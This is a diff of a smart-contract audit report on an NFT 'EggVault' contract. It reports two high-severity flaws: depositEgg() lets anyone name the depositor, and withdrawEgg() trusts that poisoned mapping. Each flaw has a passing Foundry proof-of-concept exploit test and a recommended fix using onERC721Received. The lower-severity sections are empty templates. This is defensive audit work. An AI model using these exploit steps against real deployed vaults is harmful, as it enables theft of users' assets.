@@ -139,9 +139,9 @@ Actors:
 
 # Findings
 ## High
-### [H-1] Unauthorized Depositor Spoofing/FrontRunning via Public depositEgg() Function
+### [H-1] Spoofed Depositor via depositEgg() Function
 
-**Description:** The `EggVault` contract's `depositEgg` function allows any external user to falsely claim authorship of a deposited NFT, introducing a critical logic flaw. While the function verifies that the token has been transferred to the vault, it does not securely associate the depositor with the actual sender, allowing for spoofing and front-running attacks.
+**Summary:** The `EggVault` contract's `depositEgg` function allows any external user to falsely claim authorship of a deposited NFT, introducing a critical logic flaw. While the function verifies that the token has been transferred to the vault, it does not securely associate the depositor with the actual sender, allowing for spoofing and front-running attacks.
 
 **Vulnerability Details:** The vault contract previously relied on a public `depositEgg(uint256 tokenId, address depositor)` function (or a simplified version using `msg.sender`) to track deposits. However, this introduces two core issues:
 
@@ -157,8 +157,101 @@ The vault assumes that whoever calls `depositEgg` is the rightful depositor, whi
 - This enables asset theft from the vault and undermines trust in the system.
 
 **Proof of Concept:**
-```solidity
-    function testDepositEggExploit() public {
+```javascript
+       function testSpoofedDepositorExploit() public {
+        // Mint an egg by simulating a call from the game contract.
+        vm.prank(address(game));
+        bool success = nft.mintEgg(alice, 1);
+        assertTrue(success);
+        // Check that token 1 is owned by alice.
+        assertEq(nft.ownerOf(1), alice);
+        // Verify that the totalSupply counter increments.
+        assertEq(nft.totalSupply(), 1);
+
+        //Transger egg to vault
+        vm.prank(alice);
+        nft.approve(address(vault), 1);
+        vm.prank(alice);
+        nft.transferFrom(address(alice), address(vault), 1);
+
+        // Deposit the egg into the vault.
+        vm.prank(bob);
+        vault.depositEgg(1, bob);
+        // The egg should now be marked as deposited.
+        assertTrue(vault.isEggDeposited(1));
+        // The depositor recorded should be alice, but the vault allows for anyone to input depositor
+        assertEq(vault.eggDepositors(1), bob);
+
+        // Depositing the same egg again should revert.
+        vm.prank(alice);
+        vm.expectRevert("Egg already deposited");
+        vault.depositEgg(1, alice);
+    }
+```
+
+```bash
+Ran 1 test for test/EggHuntGameTest.t.sol:EggGameTest
+[PASS] testSpoofedDepositorExploit() (gas: 176345)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.60ms (896.43µs CPU time)
+```
+
+**Recommended Mitigation:** Remove the `depositEgg()` function entirely and instead implement the [ERC721 token receiver interface](https://docs.openzeppelin.com/contracts/5.x/api/token/erc721#IERC721Receiver) using the `onERC721Received` function in the `EggVault` contract.
+
+This enables safe, atomic deposits using `safeTransferFrom`, ensuring that the depositor is always the true sender of the NFT.
+
+```javascript
+function onERC721Received(
+    address operator,
+    address from,
+    uint256 tokenId,
+    bytes calldata
+) external override returns (bytes4) {
+    require(msg.sender == address(eggNFT), "Not from expected NFT");
+    require(!storedEggs[tokenId], "Egg already deposited");
+
+    storedEggs[tokenId] = true;
+    eggDepositors[tokenId] = from;
+
+    emit EggDeposited(from, tokenId);
+
+    return this.onERC721Received.selector;
+}
+```
+Then, users can deposit their NFTs securely via:
+
+```javascript
+eggNFT.safeTransferFrom(msg.sender, address(vault), tokenId);
+```
+
+This fix:
+- Prevents spoofing and frontrunning
+- Maintains atomicity between transfer and deposit registration
+- Aligns the contract with ERC721 best practices
+
+### [H-2] Front-Running Unauthorized Withdrawals Enabled by Poisoned Depositor Mapping via withdrawEgg() Function
+
+**Summary:** The `EggVault` contract authorizes NFT withdrawals solely based on the `eggDepositors[tokenId]` mapping. However, since this mapping can be poisoned by unauthorized actors (see Finding 1), the withdrawal mechanism becomes insecure. Malicious users can withdraw NFTs they do not own, leading to permanent asset theft.
+
+**Vulnerability Details:** The `withdrawEgg(uint256 tokenId)` function includes this critical check:
+```javascript
+require(eggDepositors[tokenId] == msg.sender, "Not the original depositor");
+```
+
+However, this assumes that the `eggDepositors` mapping was correctly and securely populated during `depositEgg()`. In the current design, attackers can front-run deposits and assign themselves as depositors, bypassing ownership requirements.
+
+As a result:
+- Unauthorized users can withdraw NFTs.
+- Legitimate depositors (true owners) are blocked from retrieving their assets.
+- Vault integrity is compromised by attacker-controlled state.
+
+**Impact:**
+* Permanent theft of NFTs stored in the vault.
+* Legitimate users are denied withdrawal access to their own assets.
+* Breakdown of vault trust guarantees and user safety.
+
+**Proof of Concept:**
+```javascript
+function testUnauthorizedWithdrawalsExploit() public {
         // Mint an egg by simulating a call from the game contract.
         vm.prank(address(game));
         bool success = nft.mintEgg(alice, 1);
@@ -206,15 +299,16 @@ The vault assumes that whoever calls `depositEgg` is the rightful depositor, whi
 
 ```bash
 Ran 1 test for test/EggHuntGameTest.t.sol:EggGameTest
-[PASS] testDepositEggExploit() (gas: 203196)
-Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.78ms (2.21ms CPU time)
+[PASS] testUnauthorizedWithdrawalsExploit() (gas: 203180)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.38ms (1.64ms CPU time)
 ```
 
-**Recommended Mitigation:** Remove the `depositEgg()` function entirely and instead implement the [ERC721 token receiver interface](https://docs.openzeppelin.com/contracts/5.x/api/token/erc721#IERC721Receiver) using the `onERC721Received` function in the `EggVault` contract.
+**Recommended Mitigation:**
+Fixing this issue requires securing the deposit process so that the `eggDepositors` mapping cannot be attacker-controlled.
 
-This enables safe, atomic deposits using `safeTransferFrom`, ensuring that the depositor is always the true sender of the NFT.
+By using `onERC721Received`, you ensure that only the actual NFT sender (from) is registered as the depositor, making the withdrawal check accurate and secure.
 
-```solidity
+```javascript
 function onERC721Received(
     address operator,
     address from,
@@ -232,21 +326,13 @@ function onERC721Received(
     return this.onERC721Received.selector;
 }
 ```
-Then, users can deposit their NFTs securely via:
 
-```solidity
-eggNFT.safeTransferFrom(msg.sender, address(vault), tokenId);
-```
-
-This fix:
-- Prevents spoofing and frontrunning
-- Maintains atomicity between transfer and deposit registration
-- Aligns the contract with ERC721 best practices
+With this pattern, withdrawals will always be tied to the real depositor and not to a spoofed or front-running actor.
 
 ## Medium
 ### [M-1] `<Title>&<What it does>`
 
-**Description:**
+**Summary:**
 **Vulnerability Details:** 
 **Impact:**
 **Proof of Concept:**
@@ -256,7 +342,7 @@ This fix:
 ## Low 
 ### [L-1] `<Title>&<What it does>`
 
-**Description:**
+**Summary:**
 **Vulnerability Details:** 
 **Impact:**
 **Proof of Concept:**
@@ -266,7 +352,7 @@ This fix:
 ## Informational
 ### [I-1] `<Title>&<What it does>`
 
-**Description:**
+**Summary:**
 **Impact:**
 **Recommended Mitigation:**
 
@@ -274,6 +360,6 @@ This fix:
 ## Gas 
 ### [G-1] `<Title>&<What it does>`
 
-**Description:**
+**Summary:**
 **Impact:**
 **Recommended Mitigation:**
